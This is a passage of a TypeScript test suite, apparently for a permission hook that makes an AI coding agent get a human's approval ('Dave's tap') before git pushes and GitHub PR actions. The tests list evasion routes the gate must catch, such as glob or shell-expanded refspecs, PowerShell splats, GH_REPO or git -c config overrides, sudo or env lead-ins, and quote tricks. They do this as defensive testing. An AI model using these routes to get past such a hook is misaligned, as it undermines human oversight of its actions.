  it('remote HEAD output forms: remotes/up/develop names develop; another remote, an empty line or no remote HEAD fail closed', async () => {
    expect((await denyOf(bash('git push up develop'), devX({ remoteHeadOut: 'remotes/up/develop' })))?.pattern).toBe('ship');
    await allowed(bash('git push up feat'), devX({ remoteHeadOut: 'remotes/up/develop' }));
    expect((await denyOf(bash('git push up feat'), devX({ remoteHeadOut: 'other/main' })))?.pattern).toBe('ship');
    expect((await denyOf(bash('git push up feat'), devX({ remoteHeadOut: '' })))?.pattern).toBe('ship');
    expect((await denyOf(bash('git push up develop'), devX({ remoteHead: null })))?.pattern).toBe('ship');
  });
  it('a git throw of the remote HEAD read in a covered folder is unjudgeable with scope app-push: denied', async () => {
    const out = JSON.parse(await handleParsed(JSON.stringify(bash('git push up feat')), deps(devX({ throwOn: ['symbolic-ref --quiet --short refs/remotes/up/HEAD'] }))));
    expect(out.hookSpecificOutput.permissionDecision).toBe('deny');
    expect(out.hookSpecificOutput.permissionDecisionReason).toContain("could not verify Dave's tap");
  });
  it('push URLs of two repos stay denied for feat (the push-urls test comes before the branch test)', async () => {
    const w = at('/work/multi', { ...FOLDERS['/work/multi'], remoteHead: 'develop' });
    expect((await denyOf(bash('git push up feat', '/work/multi'), w))?.pattern).toBe('push-urls');
  });
  it('with enforceAppPush false the push of feat is a plain allow (no warn line)', async () => {
    await allowed(bash('git push up feat'), { ...devX(), config: JSON.stringify({ decisions: { enforce: true, enforceAppPush: false } }) });
  });
  it('create and merge in the same folder are unchanged: a create chained before a push of feat still needs its tap', async () => {
    expect(await denyOf(bash(`${CREATE} && git push up feat`), devX())).toMatchObject({ pattern: 'open-pr', scope: 'other' });
  });
  it('CCv3 is unchanged (G4): a push of feat to the fork still needs its ship tap', async () => {
    const w: World = { config: JSON.stringify({ decisions: { enforce: true, enforcePush: true } }) };
    expect((await denyOf(bash('git push fork feat', '/work/cc'), w))?.pattern).toBe('ship');
  });
});

// ---------- C23: the no-tap allow fails closed (fix round 2, fixer F) ----------

/**
 * The tap path: denied with no tap, scope app-push. Fix round 3 (fixer H, critic minor): the pattern is 'ship' when the source is a real ref
 * (HEAD or a branch the fake folder has a tree for). Only a row whose source is no ref (`noRef`: an expansion, a glob, a revision
 * suffix) may end at push-tree-unresolved. `tool`: the PowerShell tool reads @name as a splat.
 */
async function tapPath(cmd: string, w: World, o: { cwd?: string; noRef?: boolean; tool?: 'Bash' | 'PowerShell'; state?: boolean } = {}): Promise<string> {
  const cwd = o.cwd ?? '/work/app-x';
  const r = await denyOf(o.tool === 'PowerShell' ? pwsh(cmd, cwd) : bash(cmd, cwd), w);
  expect(r, cmd).not.toBeNull();
  expect(r!.scope, cmd).toBe('app-push');
  // Round 3 C4 (Dave 2026-11-15, "Strict here, soft in apps"): a step before the push that the gate does not model is push-state-unknown,
  // still on the tap path (enforceAppPush false softens it: R6-V4b and C4-APP), and no tap clears it.
  if (o.state) expect(r!.pattern, `${cmd}: ${r!.reason}`).toBe('push-state-unknown');
  else if (o.noRef) expect(['ship', 'push-tree-unresolved'], `${cmd}: ${r!.pattern}`).toContain(r!.pattern);
  else expect(r!.pattern, `${cmd}: ${r!.reason}`).toBe('ship');
  return r!.reason;
}

describe('C23 a push takes the no-tap allow only when every destination is a literal branch that is surely no default branch', () => {
  // Change that breaks it: drop the literal-name test (a glob or an expansion reads as a branch named '*' or '$B', no default branch).
  // Fix round 3 (fixer H): each row names whether its source is a real ref; a real source must end at 'ship', not push-tree-unresolved.
  const globs: [string, boolean][] = [['refs/heads/*:refs/heads/*', true], ['*', true], ['feat:*', false], ['HEAD:fe?t', false], ['feat:[m]ain', false]];
  for (const [spec, noRef] of globs) it(`a glob refspec takes the tap path: git push up ${spec}`, async () => { await tapPath(`git push up ${spec}`, devX(), { noRef }); });
  const expansions: [string, boolean][] = [
    ['$(echo main)', true], ['$B', true], ['ma{in,}', true], ['main~0', true], ['$(echo feat)', true], ['HEAD:$B', false], ['"$B"', true],
    ['`echo develop`', true], ['fe{at,}', true], ['feat~0', true], ['feat^', true], ['HEAD:@', false], ['feat:HEAD', false], ['feat:', false],
    ["fe'a't", false], ['fe\\at', false], ['feat!', true],
  ];
  for (const [spec, noRef] of expansions) it(`a destination or source the shell expands takes the tap path: git push up ${spec}`, async () => { await tapPath(`git push up ${spec}`, devX(), { noRef }); });
  // Fix round 3 re-pin (fixer H, strict allow-list): only <remote> <branch> with a plain branch name is on the list. heads/, refs/heads/,
  // a colon, @ and + now take the tap path (each was a no-tap allow in round 2). feat and v1.0 (no tag) stay on the list.
  it('the strict allow-list: feat and v1.0 pass; heads/topic, refs/heads/topic, HEAD:topic, @, feat:topic and a + or @ name take the tap path', async () => {
    for (const spec of ['feat', 'v1.0']) await allowed(bash(`git push up ${spec}`), devX());
    for (const spec of ['heads/topic', 'refs/heads/topic', 'HEAD:topic', '@', 'feat:topic']) await tapPath(`git push up ${spec}`, devX({ trees: { ...TREES_ALL, 'heads/topic': TREE, 'refs/heads/topic': TREE } }));
    await tapPath('git push up feat/x.y_z+1@2', devX(), { noRef: true });
  });

  // Change that breaks it: drop the config read of a bare push (git pushes every matching branch, main included).
  // Fix round 3 re-pin (fixer H, critic major 4): remote.up.mirror true and a valueless remote.up.mirror (git reads it as true) make the
  // push a --mirror push. They were the tap path in round 2; now push-unsafe, tap or not (C25 row 'mirror ... even after a tap').
  // Fix round 4 re-pin (fixer K, critic major 1): push.default=matching and a remote.up.push mapping of a bare push were the tap path; a
  // tap for topic then licensed main too. Now a hard deny (push-target-unresolved). A failed config read stays the tap path (listed).
  it('a bare push with push.default=matching or a remote.up.push refspec is denied; a failed config read takes the tap path; a true mirror is push-unsafe', async () => {
    const bare = (config: string, status?: number): World => devX({ pushRef: 'up/topic', config, ...(status === undefined ? {} : { configStatus: status }) });
    const hard = { pattern: 'push-target-unresolved', scope: 'app-push' };
    expect(await denyOf(bash('git push'), bare('push.default matching'))).toMatchObject(hard);
    expect(await denyOf(bash('git push up'), bare('push.default Matching'))).toMatchObject(hard);
    expect(await denyOf(bash('git push'), bare('remote.up.push refs/heads/*:refs/heads/*'))).toMatchObject(hard);
    expect(await denyOf(bash('git push'), bare('remote.up.mirror true'))).toMatchObject({ pattern: 'push-unsafe', scope: 'app-push' });
    expect(await denyOf(bash('git push'), bare('remote.up.mirror'))).toMatchObject({ pattern: 'push-unsafe', scope: 'app-push' });
    await tapPath('git push', bare('', 3));
  });
  // Change that breaks it: read every remote.*.push, or read push.default=simple as matching (over-deny of the common case).
  it('a bare push stays a no-tap allow when the config names only another remote, a false mirror or another push.default', async () => {
    const bare = (config: string): World => devX({ pushRef: 'up/topic', config });
    await allowed(bash('git push'), bare('remote.other.push refs/heads/*:refs/heads/*\nremote.upx.mirror true'));
    await allowed(bash('git push'), bare('remote.up.mirror false\npush.default simple'));
  });
  // Change that breaks it: ignore --repo (git then pushes to the repo it names, not to the remote the gate read).
  // Fix round 3 re-pin (fixer H, critic major 5): the tap path keyed --repo on the wrong repo. Now a hard deny push-target-unresolved.
  it('a push option that names its target (--repo, --repo=<x>) is denied push-target-unresolved, also when an earlier push has the same shape', async () => {
    const unresolved = { pattern: 'push-target-unresolved', scope: 'app-push' };
    expect(await denyOf(bash('git push --repo=https://github.com/acme/other.git'), devX({ pushRef: 'up/topic' }))).toMatchObject(unresolved);
    expect(await denyOf(bash('git push --repo https://github.com/acme/other.git up topic'), devX())).toMatchObject(unresolved);
    expect(await denyOf(bash('git push up topic && git push --repo=https://github.com/acme/other.git up topic'), devX())).toMatchObject(unresolved);
  });

  // Change that breaks it: skip the tag test (git push up v1.0 pushes the tag refs/tags/v1.0 when it exists).
  it('a local tag pushed by its bare name takes the tap path; the same name with no tag passes', async () => {
    // Fixer H: the fake folder gets a tree for v1.0 (git resolves the tag), so the row now asserts 'ship', not push-tree-unresolved.
    await tapPath('git push up v1.0', devX({ tags: ['v1.0'], trees: { ...TREES_ALL, 'v1.0': TREE } }));
    await allowed(bash('git push up v1.0'), devX());
  });

  // Change that breaks it: let a missing remote HEAD mean 'main and master only' again.
  it('no readable remote HEAD: feat takes the tap path, and the text names set-head in one plain line', async () => {
    const reason = await tapPath('git push up feat', devX({ remoteHead: null }));
    expect(reason).toContain('The default branch of remote up is not known in this checkout; git remote set-head up --auto records it.');
    expect(reason).not.toMatch(/symbolic-ref|refs\/remotes|a push to another branch does not/);
    expect(reason.split('\n')).toHaveLength(1);
  });
  // Change that breaks it: give a URL with no matching remote the main/master rule (its default branch is not known here).
  // Fix round 3 re-pin (fixer H): a URL is no remote name, so it is off the allow-list before any remote HEAD read; the text is the
  // 'can update a default branch' line, not the 'not known in this checkout' line of round 2.
  it('a URL whose repo is no remote of the checkout takes the tap path for any branch', async () => {
    const reason = await tapPath('git push https://github.com/acme/other.git feat', devX());
    expect(reason).toContain('This push can update a default branch of the repo, so it needs his tap.');
  });
  // Change that breaks it: trust the remote HEAD of a remote that pushes to another repo than it fetches from.
  it('a remote that fetches from one repo and pushes to another: its remote HEAD is not the default branch of the push target', async () => {
    const w = at('/work/split', { ...FOLDERS['/work/split'], remoteHead: 'develop', trees: TREES_ALL });
    await tapPath('git push origin feat', w, { cwd: '/work/split' });
  });
  // Change that breaks it: read '@' as a ref name for the index rule (the gate then reads @^{tree}, the tree before the commit).
  it('git push up @ after a chained commit on main reads the index tree (viaIndex)', async () => {
    const calls: string[] = [];
    const w = { ...devX({ branch: 'main', indexTree: 'i'.repeat(40) }), calls };
    expect((await denyOf(bash('git commit -m x && git push up @'), w))?.pattern).toBe('ship');
    expect(calls.filter((c) => c.endsWith(': write-tree')), calls.join(' | ')).toHaveLength(1);
    expect(calls.filter((c) => c.includes('@^{tree}')), calls.join(' | ')).toEqual([]);
  });
});

// ---------- C24: fix round 2, fixer G (R5c route, CCv3 texts, F2 advice, earlier GH_REPO, SSH tail, github field) ----------

const CC: Folder = { remotes: { fork: CCV3_URL } };
const PORT_BODY = '--body "port of https://github.com/Rev4nchist/Continuous-Claude-v3/pull/5"';
const tapCc = (): void => {
  tap('open-pr', 'Rev4nchist/Continuous-Claude-v3@feat', HEAD, 'Open draft PR');
  tap('land', 'Rev4nchist/Continuous-Claude-v3#7', HEAD, 'Land now');
};
/** The open-pr deny text of base main 7a0e2f34 (openPrWhy), byte for byte. */
const baseOpenPr = (branch: string, head: string): string =>
  `BLOCKED (decision-gate): no "open-pr" decision from Dave for ${branch} at ${head.slice(0, 7)}. Ask him first: run node scripts/github/ship-ask.mjs open-pr --branch ${branch} --json, pass its JSON to AskUserQuestion word for word, then open the PR only if he taps "Open draft PR".`;
const STOP = 'cannot be passed safely in a command; tell Dave.';
const pwsh = (command: string, cwd = '/work/app-x') => ({ tool_name: 'PowerShell', tool_input: { command }, cwd, session_id: 's-app' });

describe('C24 item 1: in a CCv3 checkout a gh segment that names another repo is denied before any CCv3 signal of the whole text', () => {
  // Change that breaks it: routeOf takes the CCv3 rule when namedRepo of the whole text names CCv3, before it tests cmd.foreign.
  it('a create with -R other/lib and a CCv3 PR URL in --body, with a valid CCv3 tap: repo-foreign', async () => {
    tapCc();
    const w = at('/work/cc', CC);
    const r = await denyOf(bash(`gh pr create -R other/lib --draft --head feat --title t ${PORT_BODY}`, '/work/cc'), w);
    expect(r).toMatchObject({ pattern: 'repo-foreign', scope: 'other' });
    expect(r!.reason).toContain('go to that repo folder');
    expect((await denyOf(bash(`${MERGE} -R other/lib ${PORT_BODY}`, '/work/cc'), w))?.pattern).toBe('repo-foreign');
  });
});

describe('C24 item 2: routeOf asks isCcv3Checkout first; a CCv3 call never reaches coverage', () => {
  const AOS = '/work/cc/apps/aos';
  const COVER = 'rev-parse --path-format=absolute --show-toplevel --git-common-dir';
  const registry = JSON.stringify({ projects: [...REGISTRY.projects, { key: 'agentic-os', path: AOS }] });
  const world = (calls: string[] = []): World => ({ folders: { ...FOLDERS, [AOS]: { ...CC, top: '/work/cc', throwOn: [COVER] } }, registry, calls });
  const cmd = `gh pr create --draft --head feat --title t ${PORT_BODY}`;
  // Change that breaks it: routeOf calls appPlace (coveredApp) before isCcv3Checkout when the whole text names CCv3 (the throw then
  // becomes AppScopeError, scope app-push, "could not verify").
  it('a create with a CCv3 URL in --body, in a CCv3 checkout that is a live nested entry: the CCv3 rule, no coverage git', async () => {
    const calls: string[] = [];
    const out = JSON.parse(await handleParsed(JSON.stringify(bash(cmd, AOS)), deps(world(calls))));
    expect(out.hookSpecificOutput.permissionDecisionReason).toBe(baseOpenPr('feat', HEAD));
    expect(calls.filter((c) => c.includes(COVER)), calls.join(' | ')).toEqual([]);
    tapCc();
    expect(await verdict(bash(cmd, AOS), world())).toEqual({ action: 'allow' });
  });
  // The base short-circuit stays: a text that names CCv3 is judged with the CCv3 key even where git remote -v fails.
  // Change that breaks it: let the isCcv3Checkout throw escape when the text names CCv3.
  it('a merge that names CCv3, with its sha and tap, from a folder where git remote -v fails: allowed, as before the card', async () => {
    tapCc();
    expect(await verdict(bash(`${MERGE} -R Rev4nchist/Continuous-Claude-v3`, '/work/nogit'))).toEqual({ action: 'allow' });
    expect(await verdict(bash(`${MERGE} ${PORT_BODY}`, '/work/nogit'))).toEqual({ action: 'allow' });
  });
});

describe('C24 item 3 (G4): the CCv3 texts and the CCv3 head read are those of base main 7a0e2f34', () => {
  // Change that breaks it: openPrWhy prints a placeholder or a note for a branch that is not a plain word.
  for (const b of ['feat#1', 'a,b', 'caf\u00E9']) {
    it(`the CCv3 open-pr text for branch ${JSON.stringify(b)} is the base text, byte for byte`, async () => {
      const w = at('/work/cc', { ...CC, branch: b, heads: { [b]: HEAD } });
      expect((await denyOf(bash('gh pr create --draft --title t', '/work/cc'), w))?.reason).toBe(baseOpenPr(b, HEAD));
    });
  }
  // Change that breaks it: the CCv3 head read takes the redirect-aware cut (base cut the create at the & of 2>&1 and read the current branch).
  // Round 3 C1 (seat pre-read finding 1): this row pinned a hole. gh gets --head other, the base cut read feat (tapped). Any redirect
  // in the create text is now refused, before any cut.
  it('a CCv3 create with --head after 2>&1 is head-unresolved (round 3: the old allow was the pre-read hole)', async () => {
    tap('open-pr', 'Rev4nchist/Continuous-Claude-v3@feat', HEAD, 'Open draft PR');
    const w = at('/work/cc', { ...CC, heads: { feat: HEAD, other: HEAD2 } });
    // C2b (class C): main with a parse gives this answer; the hand reader is retired. The parser reads --head other after the redirect and no tap covers it: open-pr.
    expect((await denyOf(bash('gh pr create --draft --title t 2>&1 --head other', '/work/cc'), w))?.pattern).toBe('open-pr');
  });
  // Change that breaks it: read the repo of a CCv3 create from the base cut too (a -R after 2>&1 still goes to gh: R5c).
  it('a CCv3 create with -R other/lib after 2>&1 is still repo-foreign', async () => {
    tapCc();
    expect((await denyOf(bash('gh pr create --draft --head feat --title t 2>&1 -R other/lib', '/work/cc'), at('/work/cc', CC)))?.pattern).toBe('repo-foreign');
  });
  // Change that breaks it: the app head read takes the base cut (the gh call gets --head main, the gate would read feat).
  it('the same create in a covered folder reads --head after 2>&1', async () => {
    openX();
    // C2b (class C): main with a parse gives this answer; the hand reader is retired. The parser reads --head main after the redirect and no tap covers it: open-pr (still a deny).
    expect((await denyOf(bash('gh pr create --draft --title t 2>&1 --head main')))?.pattern).toBe('open-pr');
  });
});

describe('C24 item 4 (F2): an unsafe value is left out when app-ask reads it itself, else one plain line; never "single quotes"', () => {
  const ODD = ['feat\u2018x', 'feat\u2019x', 'caf\u00E9', 'a,b'];
  const onFeat = (odd: string): World => ({ folders: { ...FOLDERS, '/work/app-x': { remotes: gh('acme/app-x'), heads: { feat: HEAD, [odd]: HEAD } } } });
  // Change that breaks it: give an unsafe value that is not what app-ask reads by itself a placeholder or a quoting rule again.
  for (const odd of ODD) {
    it(`a create of ${JSON.stringify(odd)} (not the current branch): no offer command, one plain line that says to tell Dave`, async () => {
      // Round 3 C1 (seat ruling A, point 5): a non-ASCII character or a comma outside quotes is refused by the create reader first.
      // Still no offer command and no quoting rule.
      const r = await denyOf(bash(`gh pr create --draft --title t --head ${odd}`), onFeat(odd));
      // C2b (class C): main with a parse gives this answer; the hand reader is retired. The parser reads the odd head as a literal word and no tap covers it: open-pr.
      expect(r?.pattern).toBe('open-pr');
      expect(commandsIn(r!.reason)).toEqual([]);
      expect(r!.reason).not.toMatch(/single quotes|fill in/);
    });
  }
  it('an unsafe folder that is not the payload cwd: no offer command, the plain line', async () => {
    const r = await denyOf(pwsh(`cd "/work/it's" && ${PUSH}`, '/work/stray'));
    expect(r?.pattern).toBe('ship');
    expect(commandsIn(r!.reason)).toEqual([]);
    expect(r!.reason).toContain(`the folder /work/it's ${STOP}`);
  });
  it('an unsafe remote that is the @{push} remote is left out (app-ask reads it); typed with no @{push}, the plain line', async () => {
    const odd = 'up\u2019x';
    const f: Folder = { remotes: { [odd]: 'https://github.com/acme/app-x.git' }, pushRef: `${odd}/feat` };
    const bare = await denyOf(bash('git push'), at('/work/app-x', f));
    expect(commandsIn(bare!.reason)).toEqual([`${ASK} push --branch feat --src HEAD --dir '/work/app-x' --json`]);
    expect(bare!.reason).toContain('app-ask reads the remote itself');
    const typed = await denyOf(bash(`git push ${odd} feat`), at('/work/app-x', { ...f, pushRef: undefined }));
    expect(commandsIn(typed!.reason)).toEqual([]);
    expect(typed!.reason).toContain(`the remote ${odd} ${STOP}`);
  });
  it('a typed URL remote is one plain word (: is safe in Bash, PowerShell and cmd)', async () => {
    const r = await denyOf(bash('git push https://github.com/acme/app-x.git main'));
    expect(commandsIn(r!.reason)).toEqual([`${ASK} push --remote https://github.com/acme/app-x.git --branch main --src main --dir '/work/app-x' --json`]);
  });
  it('a source @ is offered as HEAD (PowerShell reads a bare @ as an operator; app-ask reads HEAD as the current branch)', async () => {
    const r = await denyOf(bash('git push up @'));
    expect(commandsIn(r!.reason)).toEqual([`${ASK} push --remote up --branch feat --src HEAD --dir '/work/app-x' --json`]);
  });
});

describe('C24 item 5: a GH_REPO set in an earlier segment names the repo of the gh call (R5c)', () => {
  const forms: [string, (repo: string) => string][] = [
    ['Bash', (r) => `GH_REPO=${r}; `], ['Bash', (r) => `export GH_REPO=${r} && `], ['Bash', (r) => `env GH_REPO=${r}; `],
    ['PowerShell', (r) => `$env:GH_REPO='${r}'; `], ['PowerShell', (r) => `$env:GH_REPO="${r}"; `],
  ];
  for (const [tool, lead] of forms) {
    // Change that breaks it: read GH_REPO only in the gh segment (seat order b2 of round 1).
    it(`CCv3 folder, ${tool}: ${lead('acme/app-x')}merge or create -> repo-foreign, even with the CCv3 tap`, async () => {
      tapCc();
      const w = at('/work/cc', CC);
      expect((await denyOf({ ...bash(`${lead('acme/app-x')}${MERGE}`, '/work/cc'), tool_name: tool }, w))?.pattern).toBe('repo-foreign');
      expect((await denyOf({ ...bash(`${lead('acme/app-x')}${CREATE}`, '/work/cc'), tool_name: tool }, w))?.pattern).toBe('repo-foreign');
    });
    it(`covered folder, ${tool}: ${lead('other/lib')}merge or create -> repo-differs`, async () => {
      mergeX(); openX();
      expect((await denyOf({ ...bash(`${lead('other/lib')}${MERGE}`), tool_name: tool }))?.pattern).toBe('repo-differs');
      expect((await denyOf({ ...bash(`${lead('other/lib')}${CREATE}`), tool_name: tool }))?.pattern).toBe('repo-differs');
    });
  }
  it('covered: the same repo set earlier passes with its tap; a variable is unreadable; a quoted mention is text', async () => {
    mergeX();
    expect(await passes(bash(`export GH_REPO=acme/app-x; ${MERGE}`))).toBe(true);
    expect((await denyOf(bash(`export GH_REPO=$X; ${MERGE}`)))?.pattern).toBe('repo-unreadable');
    expect(await passes(bash(`echo "GH_REPO=other/lib"; ${MERGE}`))).toBe(true);
  });
  it('two creates with the same text after two different earlier GH_REPO values: both are judged', async () => {
    openX();
    expect((await denyOf(bash(`export GH_REPO=acme/app-x; ${CREATE}; export GH_REPO=other/lib; ${CREATE}`)))?.pattern).toBe('repo-differs');
  });
});

describe('C24 item 6: only an SSH form maps to the github field; an https mirror keys as local:<entry>:<url>', () => {
  const GLAB = '/work/glab';
  const w: World = {
    folders: { ...FOLDERS, [GLAB]: { remotes: { origin: 'git@github-work:acme/app.git', mirror: 'https://gitlab.com/acme/app.git' } } },
    registry: JSON.stringify({ projects: [...REGISTRY.projects, { key: 'glab', path: GLAB, github: 'acme/app' }] }),
  };
  // Change that breaks it: keyRepo maps the owner/repo tail of any host to the github field (the main tap then licenses the gitlab push).
  it('a ship tap for acme/app main licenses the SSH alias remote, not the gitlab https mirror', async () => {
    tap('ship', 'acme/app@main', HEAD, 'Commit and push', TREE);
    expect(await passes(bash('git push origin main', GLAB), w)).toBe(true);
    const r = await denyOf(bash('git push mirror main', GLAB), w);
    expect(r?.pattern).toBe('ship');
    expect(r!.reason).toContain('local:glab:https://gitlab.com/acme/app.git');
  });
});

describe('C24 item 7: an SSH alias remote of an entry with no github field names the way out (A3 residue)', () => {
  const A2 = '/work/alias2';
  const w: World = {
    folders: { ...FOLDERS, [A2]: { remotes: { origin: 'git@github-work:Acme/Alias2.git' } } },
    registry: JSON.stringify({ projects: [...REGISTRY.projects, { key: 'alias2', path: A2 }] }),
  };
  const LINE = 'the registry entry alias2 needs a github field naming owner/repo';
  // Change that breaks it: drop the github-field line (the deny then offers app-ask open-pr or merge, which refuses: a dead end).
  for (const [name, cmd, pattern] of [['create', CREATE, 'open-pr'], ['merge', MERGE, 'land'], ['merge with no head', 'gh pr merge 7', 'merge-no-head']]) {
    it(`${name}: denied ${pattern}, no offer command, and the line that the entry needs a github field`, async () => {
      const r = await denyOf(bash(cmd, A2), w);
      expect(r?.pattern).toBe(pattern);
      expect(commandsIn(r!.reason)).toEqual([]);
      expect(r!.reason).toContain(LINE);
      expect(r!.reason).toMatch(/tell Dave/);
      expect(r!.reason).not.toMatch(/\bfork\b|\boff\b|ship-ask|land-pr/);
    });
  }
  // Change that breaks it: apply the github-field line only when ghKey is ok (a -R of the alias repo gives repo-differs with an offer
  // command that app-ask refuses).
  it('a create that names the alias repo with -R: repo-differs, and the same github-field line instead of an offer command', async () => {
    const r = await denyOf(bash(`${CREATE} -R acme/alias2`, A2), w);
    expect(r?.pattern).toBe('repo-differs');
    expect(commandsIn(r!.reason)).toEqual([]);
    expect(r!.reason).toContain(LINE);
  });
  it('a push from that folder keeps its offer (app-ask keys a push on local:)', async () => {
    const r = await denyOf(bash('git push origin feat', A2), w);
    expect(commandsIn(r!.reason)).toEqual([`${ASK} push --remote origin --branch feat --src feat --dir '/work/alias2' --json`]);
  });
});

// ---------- C25: fix round 3, fixer H (the strict positive allow-list, hard denies, the app-only deadline, the SSH host) ----------

describe('C25 item 1: a covered push skips the tap only as git push [listed options] [<remote> <branch>]', () => {
  // Change that breaks it: accept a word that starts with @ (PowerShell splats @b into the values of $b, so git gets other refspecs).
  const splats: [string, boolean][] = [['@b', true], ['HEAD:@b', false], ['feat:@b', false]];
  for (const tool of ['PowerShell', 'Bash'] as const) {
    for (const [spec, noRef] of splats) it(`${tool} tool: git push up ${spec} takes the tap path`, async () => { await tapPath(`git push up ${spec}`, devX(), { tool, noRef }); });
  }
  // Change that breaks it: read no global option of the push call (git -c sets push config for this one call).
  // Fix round 4 re-pin (fixer K): a -c push key is a hard deny now (C26 item 1); --no-pager and another -c key stay the tap path.
  it('git -c push.default=matching push and a -c remote.up.push mapping are denied; --no-pager and -c core.* take the tap path', async () => {
    expect((await denyOf(bash('git -c push.default=matching push'), devX({ pushRef: 'up/topic' })))?.pattern).toBe('push-target-unresolved');
    expect((await denyOf(bash('git -c remote.up.push=refs/heads/topic:refs/heads/main push up topic'), devX()))?.pattern).toBe('push-target-unresolved');
    await tapPath('git --no-pager push up topic', devX());
    await tapPath('git -c core.quotepath=off push up topic', devX());
  });
  // Fix round 4 (fixer K, critic minor 7): CONFIG_TEXT is gone and its rows with it. No row needed it: GIT_CONFIG_COUNT=1 before git fails
  // strictCall (a lead-in), and an earlier export or $env: assignment is an 'other' segment for steadyCommand (both pinned in rows below).
  // Change that breaks it: accept a lead-in before git (VAR=x, env or sudo reads another config; xargs adds refspecs from stdin).
  // Fix round 4 (fixer K): the GIT_CONFIG_* forms of the dropped CONFIG_TEXT row are here; strictCall (lead-in) and steadyCommand (an
  // assignment segment) keep them off the list.
  it('a lead-in before git, or HOME or GIT_CONFIG_* set earlier in the text, takes the tap path', async () => {
    for (const cmd of ['HOME=/tmp/h git push up topic', 'env A=1 git push up topic', 'sudo git push up topic']) await tapPath(cmd, devX());
    // Round 3 C4 (Dave 2026-11-15): echo piped into xargs, and an export before the push (it changes the config git reads), are steps
    // before the push the gate does not model: push-state-unknown, on the tap path.
    for (const cmd of ['echo main | xargs git push up topic', 'export HOME=/tmp/h; git push up topic', 'export GIT_CONFIG_PARAMETERS=x; git push up topic']) await tapPath(cmd, devX(), { state: true });
    await tapPath('GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=push.default GIT_CONFIG_VALUE_0=matching git push', devX({ pushRef: 'up/topic' }));
    // Round 3 C4: a $env: setting before the push changes the config git reads: push-state-unknown, on the tap path.
    await tapPath('$env:GIT_CONFIG_COUNT=1; git push up topic', devX(), { tool: 'PowerShell', state: true });
  });
  // Change that breaks it: let a name that starts with tags/ (git reads refs/tags/<n>) be a branch.
  it('git push up tags/v1.0 takes the tap path', async () => {
    await tapPath('git push up tags/v1.0', devX({ tags: ['v1.0'], trees: { ...TREES_ALL, 'tags/v1.0': TREE } }));
  });
  // Change that breaks it: drop the show-ref tag test, or allow a colon refspec (a source tag v1.0 creates refs/tags/topic).
  it('git push up v1.0 with a local tag, and v1.0:topic with a source tag, take the tap path', async () => {
    const w = devX({ tags: ['v1.0'], trees: { ...TREES_ALL, 'v1.0': TREE } });
    await tapPath('git push up v1.0', w);
    await tapPath('git push up v1.0:topic', w);
  });
  // Change that breaks it: accept --follow-tags (it pushes annotated tags as well).
  // Fix round 4 re-pin (fixer K, critic major 1): --follow-tags, push.followTags and a colon-less remote.up.push mapping were the tap
  // path; a branch tap then licensed tags or main. Now a hard deny (push-target-unresolved), tap or not.
  it('--follow-tags is denied', async () => { expect((await denyOf(bash('git push --follow-tags up topic'), devX()))?.pattern).toBe('push-target-unresolved'); });
  // Change that breaks it: drop push.followtags from the config read.
  it('push.followTags true is denied; false stays a no-tap allow', async () => {
    expect((await denyOf(bash('git push up topic'), devX({ config: 'push.followtags true' })))?.pattern).toBe('push-target-unresolved');
    await allowed(bash('git push up topic'), devX({ config: 'push.followtags false' }));
  });
  // Change that breaks it: read remote.<r>.push for a bare push only (git maps a colon-less refspec through it too).
  it('colon-less feat with remote.up.push = refs/heads/feat:refs/heads/main is denied', async () => {
    expect((await denyOf(bash('git push up feat'), devX({ config: 'remote.up.push refs/heads/feat:refs/heads/main' })))?.pattern).toBe('push-target-unresolved');
  });
  // Change that breaks it: accept an option that is not listed, or a third positional, or a remote or branch out of the name rules.
  it('an unlisted option, one positional, three positionals, HEAD, a ref namespace, .., //, a trailing / or .lock take the tap path', async () => {
    for (const cmd of ['git push --no-verify up topic', 'git push -o ci.skip up topic', 'git push --atomic up topic', 'git push up -- topic', 'git push up HEAD', 'git push up topic feat']) await tapPath(cmd, devX());
    await tapPath('git push up', devX({ pushRef: 'up/topic' }));
    for (const spec of ['remotes/up/x', 'a..b', 'a//b', 'x/', 'x.lock']) await tapPath(`git push up ${spec}`, devX(), { noRef: true });
  });
  // Change that breaks it: drop -u or another listed option from the allow-list.
  it('git push -u up feat (and each listed option) passes with no tap and no tree read', async () => {
    for (const opt of ['-u', '--set-upstream', '-q', '--quiet', '-v', '--verbose', '--porcelain', '--progress', '--no-progress']) {
      const calls: string[] = [];
      await allowed(bash(`git push ${opt} up feat`), { ...devX(), calls });
      expect(calls.filter((c) => TREE_READ.test(c)), opt).toEqual([]);
    }
  });
  it('git push up feat with a readable remote HEAD main passes with no tap (Bash and PowerShell tool)', async () => {
    await allowed(bash('git push up feat'), devX({ remoteHead: 'main' }));
    await allowed(pwsh('git push up feat'), devX({ remoteHead: 'main' }));
  });
  // Change that breaks it: refuse every global option (a -C folder is how a push names its repo), or check quotes in the -C value.
  it('a -C folder (quoted or not) and the git-safe form stay on the list; the git-for form does not', async () => {
    await allowed(bash('git -C /work/app-x push up feat', '/work/stray'), devX());
    await allowed(bash('git -C "/work/app-x" push up feat', '/work/stray'), devX());
    await allowed(bash('pwsh -NoProfile -File scripts/git-safe.ps1 push up feat'), devX());
    await tapPath('git-for.ps1 -UseGitSafe push up feat', devX());
  });
  // Change that breaks it: match the executable by a negative test (any pwsh flag before -File, such as -WorkingDirectory, moves the push).
  it('a pwsh flag other than -NoProfile before git-safe.ps1, or a variable in the git path, takes the tap path', async () => {
    await tapPath('pwsh -WorkingDirectory D:/other -File scripts/git-safe.ps1 push up feat', devX());
    await tapPath('$G/git push up feat', devX());
  });
  // Change that breaks it: let the quotes-deleted reading earn the allow (drop !call.squashed in strictCall AND the segment rule of
  // steadyCommand: the masked reading sees no push in this segment, so steadyCommand alone already keeps it off the list).
  it('a push the shell reads only with its quotes deleted (git "push", g"it" push) takes the tap path', async () => {
    await tapPath('git "push" up feat', devX());
    await tapPath('g"it" push up feat', devX());
  });
  // Change that breaks it: judge a push without the rest of its command (an earlier segment switches the branch of a bare push, makes a
  // tag of the pushed name, or writes the push config the gate reads now). Fixer H, advisor review: only cd, read-only git, plain commits,
  // pushes and a 2>&1 may share the command with a no-tap push.
  it('a push after a checkout, a tag or a config write in the same command takes the tap path, as push-state-unknown (round 3 C4)', async () => {
    for (const cmd of ['git checkout main && git push', 'git switch main; git push', 'git tag topic && git push up topic', 'git config push.default matching && git push', 'git add -A && git push up topic']) {
      await tapPath(cmd, devX({ pushRef: 'up/topic' }), { state: true });
    }
  });
  it('cd, read-only git, a plain commit and 2>&1 keep a push on the list', async () => {
